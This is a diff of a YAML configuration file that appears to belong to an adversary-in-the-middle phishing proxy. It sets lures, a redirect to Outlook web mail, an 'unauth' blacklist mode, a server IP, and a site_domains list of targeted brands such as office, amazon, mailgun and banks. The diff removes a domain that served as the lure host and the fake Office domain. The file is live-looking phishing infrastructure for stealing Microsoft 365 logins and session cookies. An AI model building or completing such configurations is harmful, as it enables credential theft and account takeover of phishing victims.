@@ -2,7 +2,7 @@ blacklist_mode: unauth
 cookie_key: ""
 ip: 209.159.155.110
 lures:
-    - hostname: mocwellness.org
+    - hostname: ""
       info: ""
       og_desc: ""
       og_image: ""
@@ -23,7 +23,7 @@ proxy_type: http
 proxy_username: ""
 redirect_key: vo
 redirect_url: https://outlook.office.com/mail/
-server: mocwellness.org
+server: ""
 simplebot_enabled: false
 site_domains:
     amazon: ""
@@ -60,7 +60,7 @@ site_domains:
     mail: ""
     mailgun: ""
     nsbank: ""
-    office: mocwellness.org
+    office: ""
     outlook: ""
     ovh: ""
     payfit: ""
